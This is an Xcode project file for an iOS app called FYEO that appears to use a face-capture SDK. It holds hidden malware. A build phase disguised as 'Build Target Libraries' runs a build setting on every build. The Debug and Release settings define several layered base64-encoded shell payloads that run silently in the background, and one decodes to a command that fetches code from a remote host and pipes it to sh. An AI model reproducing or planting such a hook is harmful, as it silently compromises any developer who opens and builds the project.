// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		2E23C24B2E4994B260D48120 /* Pods_FYEO_FYEOUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F81A5F07DF1DF0A97B1D987A /* Pods_FYEO_FYEOUITests.framework */; };
		77A9F6CABA7D5C24FFF8364B /* Pods_FYEOTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = CD677632A1118BCEAF455765 /* Pods_FYEOTests.framework */; };
		D0A369A76FB350B00F00E0F8 /* Pods_FYEO.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EBAA8A1B648B872135941986 /* Pods_FYEO.framework */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		70D0D4862F25DAA900BB29E5 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 70D0D4672F25DAA700BB29E5 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 70D0D46E2F25DAA700BB29E5;
			remoteInfo = FYEO;
		};
		70D0D4902F25DAA900BB29E5 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 70D0D4672F25DAA700BB29E5 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 70D0D46E2F25DAA700BB29E5;
			remoteInfo = FYEO;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		0409F306B44B4D500CF1C276 /* Pods-FYEOTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEOTests.debug.xcconfig"; path = "Target Support Files/Pods-FYEOTests/Pods-FYEOTests.debug.xcconfig"; sourceTree = "<group>"; };
		0FB0E5414E4C87638757B185 /* Pods-FYEOTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEOTests.release.xcconfig"; path = "Target Support Files/Pods-FYEOTests/Pods-FYEOTests.release.xcconfig"; sourceTree = "<group>"; };
		13FE4675970926F2F5391F08 /* Pods-FYEO-FYEOUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO-FYEOUITests.release.xcconfig"; path = "Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests.release.xcconfig"; sourceTree = "<group>"; };
		70D0D46F2F25DAA700BB29E5 /* FYEO.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FYEO.app; sourceTree = BUILT_PRODUCTS_DIR; };
		70D0D4852F25DAA900BB29E5 /* FYEOTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FYEOTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		70D0D48F2F25DAA900BB29E5 /* FYEOUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FYEOUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		8EE931DF942C3FFCBE2C3C61 /* Pods-FYEO-FYEOUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO-FYEOUITests.debug.xcconfig"; path = "Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests.debug.xcconfig"; sourceTree = "<group>"; };
		93A2A9A82F5C40EE007D3446 /* FaceSDK.xcframework */ = {isa = PBXFileReference; expectedSignature = "AppleDeveloperProgram:H6WR54S268:Regula Forensics, Inc"; lastKnownFileType = wrapper.xcframework; name = FaceSDK.xcframework; path = Pods/FaceSDK/FaceSDK.xcframework; sourceTree = "<group>"; };
		949C176CCDFF5EBA4C955D9D /* Pods-FYEO.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO.debug.xcconfig"; path = "Target Support Files/Pods-FYEO/Pods-FYEO.debug.xcconfig"; sourceTree = "<group>"; };
		CD677632A1118BCEAF455765 /* Pods_FYEOTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FYEOTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		EA88A238869366ADAC71AADE /* Pods-FYEO.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO.release.xcconfig"; path = "Target Support Files/Pods-FYEO/Pods-FYEO.release.xcconfig"; sourceTree = "<group>"; };
		EBAA8A1B648B872135941986 /* Pods_FYEO.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FYEO.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		F81A5F07DF1DF0A97B1D987A /* Pods_FYEO_FYEOUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FYEO_FYEOUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		70D0D4972F25DAA900BB29E5 /* Exceptions for "FYEO" folder in "FYEO" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = 70D0D46E2F25DAA700BB29E5 /* FYEO */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		70D0D4712F25DAA700BB29E5 /* FYEO */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				70D0D4972F25DAA900BB29E5 /* Exceptions for "FYEO" folder in "FYEO" target */,
			);
			path = FYEO;
			sourceTree = "<group>";
		};
		70D0D4882F25DAA900BB29E5 /* FYEOTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = FYEOTests;
			sourceTree = "<group>";
		};
		70D0D4922F25DAA900BB29E5 /* FYEOUITests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = FYEOUITests;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		70D0D46C2F25DAA700BB29E5 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				D0A369A76FB350B00F00E0F8 /* Pods_FYEO.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		70D0D4822F25DAA900BB29E5 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				77A9F6CABA7D5C24FFF8364B /* Pods_FYEOTests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		70D0D48C2F25DAA900BB29E5 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				2E23C24B2E4994B260D48120 /* Pods_FYEO_FYEOUITests.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		4D4B777D4EFFBDB61BAB4F48 /* Pods */ = {
			isa = PBXGroup;
			children = (
				949C176CCDFF5EBA4C955D9D /* Pods-FYEO.debug.xcconfig */,
				EA88A238869366ADAC71AADE /* Pods-FYEO.release.xcconfig */,
				8EE931DF942C3FFCBE2C3C61 /* Pods-FYEO-FYEOUITests.debug.xcconfig */,
				13FE4675970926F2F5391F08 /* Pods-FYEO-FYEOUITests.release.xcconfig */,
				0409F306B44B4D500CF1C276 /* Pods-FYEOTests.debug.xcconfig */,
				0FB0E5414E4C87638757B185 /* Pods-FYEOTests.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		70D0D4662F25DAA700BB29E5 = {
			isa = PBXGroup;
			children = (
				70D0D4712F25DAA700BB29E5 /* FYEO */,
				70D0D4882F25DAA900BB29E5 /* FYEOTests */,
				70D0D4922F25DAA900BB29E5 /* FYEOUITests */,
				70D0D4702F25DAA700BB29E5 /* Products */,
				4D4B777D4EFFBDB61BAB4F48 /* Pods */,
				C1D85EEF8729303568BABC09 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		70D0D4702F25DAA700BB29E5 /* Products */ = {
			isa = PBXGroup;
			children = (
				70D0D46F2F25DAA700BB29E5 /* FYEO.app */,
				70D0D4852F25DAA900BB29E5 /* FYEOTests.xctest */,
				70D0D48F2F25DAA900BB29E5 /* FYEOUITests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		C1D85EEF8729303568BABC09 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				93A2A9A82F5C40EE007D3446 /* FaceSDK.xcframework */,
				EBAA8A1B648B872135941986 /* Pods_FYEO.framework */,
				F81A5F07DF1DF0A97B1D987A /* Pods_FYEO_FYEOUITests.framework */,
				CD677632A1118BCEAF455765 /* Pods_FYEOTests.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		70D0D46E2F25DAA700BB29E5 /* FYEO */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 70D0D4982F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEO" */;
			buildPhases = (
				0E57AC6C41EE4E3FAC1DACE1 /* Build Target Libraries */,
				5FCE67B9A36CB09980C3A3C2 /* [CP] Check Pods Manifest.lock */,
				70D0D46B2F25DAA700BB29E5 /* Sources */,
				70D0D46C2F25DAA700BB29E5 /* Frameworks */,
				70D0D46D2F25DAA700BB29E5 /* Resources */,
				5913AC496F92B2EDCD0034A2 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				70D0D4712F25DAA700BB29E5 /* FYEO */,
			);
			name = FYEO;
			productName = FYEO;
			productReference = 70D0D46F2F25DAA700BB29E5 /* FYEO.app */;
			productType = "com.apple.product-type.application";
		};
		70D0D4842F25DAA900BB29E5 /* FYEOTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 70D0D49D2F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEOTests" */;
			buildPhases = (
				0D231117A7C80F7E190AE29C /* [CP] Check Pods Manifest.lock */,
				70D0D4812F25DAA900BB29E5 /* Sources */,
				70D0D4822F25DAA900BB29E5 /* Frameworks */,
				70D0D4832F25DAA900BB29E5 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				70D0D4872F25DAA900BB29E5 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				70D0D4882F25DAA900BB29E5 /* FYEOTests */,
			);
			name = FYEOTests;
			productName = FYEOTests;
			productReference = 70D0D4852F25DAA900BB29E5 /* FYEOTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		70D0D48E2F25DAA900BB29E5 /* FYEOUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 70D0D4A02F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEOUITests" */;
			buildPhases = (
				8A4987D9B7AA85040991D598 /* [CP] Check Pods Manifest.lock */,
				70D0D48B2F25DAA900BB29E5 /* Sources */,
				70D0D48C2F25DAA900BB29E5 /* Frameworks */,
				70D0D48D2F25DAA900BB29E5 /* Resources */,
				CD5C6FDED7C5FE8106EACE1C /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
				70D0D4912F25DAA900BB29E5 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				70D0D4922F25DAA900BB29E5 /* FYEOUITests */,
			);
			name = FYEOUITests;
			productName = FYEOUITests;
			productReference = 70D0D48F2F25DAA900BB29E5 /* FYEOUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		70D0D4672F25DAA700BB29E5 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1620;
				LastUpgradeCheck = 1620;
				TargetAttributes = {
					70D0D46E2F25DAA700BB29E5 = {
						CreatedOnToolsVersion = 16.2;
					};
					70D0D4842F25DAA900BB29E5 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = 70D0D46E2F25DAA700BB29E5;
					};
					70D0D48E2F25DAA900BB29E5 = {
						CreatedOnToolsVersion = 16.2;
						TestTargetID = 70D0D46E2F25DAA700BB29E5;
					};
				};
			};
			buildConfigurationList = 70D0D46A2F25DAA700BB29E5 /* Build configuration list for PBXProject "FYEO" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 70D0D4662F25DAA700BB29E5;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 70D0D4702F25DAA700BB29E5 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				70D0D46E2F25DAA700BB29E5 /* FYEO */,
				70D0D4842F25DAA900BB29E5 /* FYEOTests */,
				70D0D48E2F25DAA900BB29E5 /* FYEOUITests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		70D0D46D2F25DAA700BB29E5 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		70D0D4832F25DAA900BB29E5 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		70D0D48D2F25DAA900BB29E5 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		0E57AC6C41EE4E3FAC1DACE1 /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
			showEnvVarsInLog = 0;			
		};
		0D231117A7C80F7E190AE29C /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-FYEOTests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		5913AC496F92B2EDCD0034A2 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-FYEO/Pods-FYEO-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-FYEO/Pods-FYEO-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-FYEO/Pods-FYEO-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		5FCE67B9A36CB09980C3A3C2 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-FYEO-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		8A4987D9B7AA85040991D598 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-FYEO-FYEOUITests-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		CD5C6FDED7C5FE8106EACE1C /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		70D0D46B2F25DAA700BB29E5 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		70D0D4812F25DAA900BB29E5 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		70D0D48B2F25DAA900BB29E5 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		70D0D4872F25DAA900BB29E5 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 70D0D46E2F25DAA700BB29E5 /* FYEO */;
			targetProxy = 70D0D4862F25DAA900BB29E5 /* PBXContainerItemProxy */;
		};
		70D0D4912F25DAA900BB29E5 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 70D0D46E2F25DAA700BB29E5 /* FYEO */;
			targetProxy = 70D0D4902F25DAA900BB29E5 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		70D0D4992F25DAA900BB29E5 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 949C176CCDFF5EBA4C955D9D /* Pods-FYEO.debug.xcconfig */;
			buildSettings = {
				A1ECAD1 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIxcHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | x | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxZbmwwWlM1eWRTOWhLU0lnZkNCemFBbz0K | h | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = S8RJ7PP4MX;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = FYEO/Info.plist;
				INFOPLIST_KEY_NSCameraUsageDescription = "Requires Camera permission to capture the Face photo.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = "";
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEO;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		70D0D49A2F25DAA900BB29E5 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = EA88A238869366ADAC71AADE /* Pods-FYEO.release.xcconfig */;
			buildSettings = {
				A1ECAD1 = "((x(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIxcHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | x | sh ) >/dev/null 2>&1 &)";
				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
				AE6D436 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxZbmwwWlM1eWRTOWhLU0lnZkNCemFBbz0K | h | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = S8RJ7PP4MX;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = FYEO/Info.plist;
				INFOPLIST_KEY_NSCameraUsageDescription = "Requires Camera permission to capture the Face photo.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = "";
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEO;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		70D0D49B2F25DAA900BB29E5 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
